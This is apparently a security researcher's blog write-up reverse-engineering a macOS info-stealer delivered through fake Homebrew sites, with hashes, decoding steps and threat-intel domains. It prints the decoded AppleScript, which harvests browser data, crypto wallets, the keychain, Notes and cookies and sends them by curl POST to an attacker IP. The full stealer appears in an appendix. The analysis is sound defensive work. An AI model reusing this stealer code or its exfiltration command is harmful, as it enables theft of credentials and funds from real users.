---
staticPath: badbrew
Title: Bad Brew
Description: Reverse engineering a macOS info-stealer sample.
Date: 2024-11-28
tags:
  - Malware
  - MacOS
---
This began when someone in my community linked me to this [tweet](https://x.com/ryanchenkie/status/1880730173634699393).

![[Pasted image 20250501070501.png]]

It's a malicious Homebrew clone! Below is the target site:

![[Pasted image 20250120122256.png]]

The following was the target site. Thankfully, it's taken down now.

```
hxxps[://]norikosumiya[.]com/brew/update
```

There's still a copy on the Internet Archive.

```
file update
update: Mach-O universal binary with 2 architectures: [x86_64:\012- Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|WEAK_DEFINES|BINDS_TO_WEAK|PIE>] [\012- arm64:\012- Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|BINDS_TO_WEAK|PIE>]
```

Here's the hash:

```
b329b32fa3e87f2e8ff7dc3d080e2d042a5484d26f220028b556000389a437c5  update
```

When opening the sample in Ghidra, I find both an x86 binary and an Apple Silicon ARM binary. ![[Pasted image 20250120124653.png]]

Running `strings` on the sample reveals a large blob of hexadecimal data, which is likely an encrypted payload. Below is a listing of the two executables in more detail.

![[Pasted image 20250120141702.png]]

The following is how I extracted just the x86 payload:

```
ec2-user@ip-172-31-38-236 ~ % lipo -detailed_info  update              
Fat header in: update
fat_magic 0xcafebabe
nfat_arch 2
architecture x86_64
    cputype CPU_TYPE_X86_64
    cpusubtype CPU_SUBTYPE_X86_64_ALL
    capabilities 0x0
    offset 16384
    size 87408
    align 2^14 (16384)
architecture arm64
    cputype CPU_TYPE_ARM64
    cpusubtype CPU_SUBTYPE_ARM64_ALL
    capabilities 0x0
    offset 114688
    size 119968
    align 2^14 (16384)
ec2-user@ip-172-31-38-236 ~ % dd if=update of=update86 iseek=16384 count=87408 bs=1
87408+0 records in
87408+0 records out
87408 bytes transferred in 0.292199 secs (299139 bytes/sec)
ec2-user@ip-172-31-38-236 ~ % file update86
update86: Mach-O 64-bit executable x86_64
```

### Strings Output

You should always run `strings` when doing reverse engineering. Three strings came from the sample:

1. A massive hexadecimal-like string.
2. A smaller hexadecimal-like string.
3. `ndh3M@pWfiQzBKVlu0!g>+(7U1RSsoL=tHqO)9<2y5wj8T_$kZe%CYmIDv-A4XG#`

### Overview of Entry Function

![[Pasted image 20250125221225.png]]

The entry function copies these strings into memory and then calls some functions. It then calls `system` twice.

### Lookup Table

![[Pasted image 20250125221316.png]]

It turns out the script uses a lookup table to decode the hexadecimal data. The `<<2` operation ensures alignment to `uint64_t`. `r12_1` is the string beginning with `ndh`. Below is how I recreated the code in Python. `__b_1` is a large allocated array that's used as a lookup table.

![[Pasted image 20250125221531.png]]

Below is what the lookup table looks like. On the left, I have the keys, and on the right, I have values ranging from `0x0` to `0x3F`, which is 64 bits. This is why I shift by 6 when reconstructing the strings using the lookup table.

![[Pasted image 20250125221623.png]]

Here’s the sample using the lookup table:

![[Pasted image 20250125221755.png]]

Note that it shifts by 6 and then performs a bitwise OR with the looked-up value to construct the final string. Here, `__b_1` is the lookup table buffer, and `rcx_5` represents values from the hexadecimal-like strings. Below is what building out the string looks like it shifts by 6 each time.

![[Pasted image 20250126081733.png]]

### Putting It Together

```python
def populate_lookup_table(input_string):
    input_bytes = input_string.encode("utf-8")
    lookup_table = [0xFFFFFFFF] * 256

    for i in range(0, len(input_bytes), 4):
        for j in range(min(4, len(input_bytes) - i)):  
            byte_value = input_bytes[i + j]
            lookup_table[byte_value] = i + j

    return lookup_table

def use_lookup_table_from_hex(hex_string, lookup_table):
    input_bytes = bytes.fromhex(hex_string)
    composite_value = 0

    for byte in input_bytes:
        table_value = lookup_table[byte]
        composite_value = (composite_value << 6) | table_value

    return composite_value

arg3 = "ndh3M@pWfiQzBKVlu0!g>+(7U1RSsoL=tHqO)9<2y5wj8T_$kZe%CYmIDv-A4XG#"

lookup_table = populate_lookup_table(arg3)

hex_string = "31686..."

result = use_lookup_table_from_hex(hex_string, lookup_table)

print("Decoded Value", bytes.fromhex(str(hex(result))[2:]).decode("utf-8"))
```

This yields the decrypted AppleScript payload!

### Grabbing Information

```
set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/"}, {"Coccoc", library & "Coccoc/"}}
set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
if release then
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
	readwrite2(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
	readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
end if
if filegrabbers then
	filegrabber(writemind)
end if
writeText(username, writemind & "username")
set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
```

It goes after:
- Browser files
- Crypto files
- Apple notes
- Mac OS keychain
### Sending the Results

```
curl -X POST -H \"user: y4CesUC1cxsB9LSNtlrLYJfkctcWwvyW/aWZf12pTkk=\" -H \"BuildID: hYoyhCi0fMW7ns2Jn6Wq9wJm8WHNhuJMb7KvOOCC8No=\" -H \"cl: 0\" -H \"cn: 0\" --max-time 300 -retry 5 -retry-delay 10 -F \"file=@/tmp/out.zip\" http://81.19.135.54/joinsystem
```

### Cleaning Up

```
do shell script "rm -r " & writemind
do shell script "rm /tmp/out.zip"
```

### Second system call

The second call just closes the terminal.

```
disown; pkill Terminal
```
### Threat Intel

It looks like `brewe[.]sh` was registered on `2024-12-22`.

![[Pasted image 20250125222548.png]]

[cyb3r-hawk](https://medium.com/@cyb3r-hawk/theres-a-clone-of-brew-brewe-sh-612e4d03e1f6) also identified the following domains associated with this campaign:

```
homebrew[.]cx
```

`homebrew[.]cx` appears to be an older version. According to the Wayback Machine, it appeared very similar to the sites. It was last active around may 2024 ![[Pasted image 20250125220622.png]]

They also identified `brewmacos[.]com`:

![[Pasted image 20250125222754.png]]

The `install.sh` is an actual copy of the Homebrew install script, except it pulls down the site's malicious binary.

![[Pasted image 20250125223007.png]]

This is interesting because `brewe[.]sh` didn’t even bother to replicate the functionality of the homebrew script. A hash comparison between `brewe[.]sh` and `macosbrew[.]com` reveals they are different.

```
sha256sum update brewinstaller
b329b32fa3e87f2e8ff7dc3d080e2d042a5484d26f220028b556000389a437c5  update
fa1ffa024184f8ade3ef294b5a7a485a48f52361fbf53d37635c2079c57ebcbb  brewinstaller
```

Looking at the Brew installer binary, it appears more "sophisticated" — more details to come!
# Appendix A: full applescript text
```ap
d filegrabber
on send_data(attempt)
 try
  set result_send to (do shell script "curl -X POST -H \"user: y4CesUC1cxsB9LSNtlrLYJfkctcWwvyW/aWZf12pTkk=\" -H \"BuildID: hYoyhCi0fMW7ns2Jn6Wq9wJm8WHNhuJMb7KvOOCC8No=\" -H \"cl: 0\" -H \"cn: 0\" --max-time 300 -retry 5 -retry-delay 10 -F \"file=@/tmp/out.zip\" http://81.19.135.54/joinsystem")
 on error
  if attempt < 40 then
   delay 3
   send_data(attempt + 1)
  end if
 end try
end send_data
set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000 + 1000))"
set writemind to "/tmp/" & randomNumber & "/"
try
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try
set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind)
delay 0.01
set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/"}, {"Coccoc", library & "Coccoc/"}}
set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
if release then
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
	readwrite2(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
	readwrite2(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
	readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
end if
if filegrabbers then
	filegrabber(writemind)
end if
writeText(username, writemind & "username")
set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
repeat with firefox in ff_paths
	try
		parseFF(firefox, writemind)
	end try
end repeat
chromium(writemind, chromiumMap)
deskwallets(writemind, walletMap)
telegram(writemind, library)
do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/out.zip"
send_data(0)
do shell script "rm -r " & writemind
do shell script "rm /tmp/out.zip"
'&
```
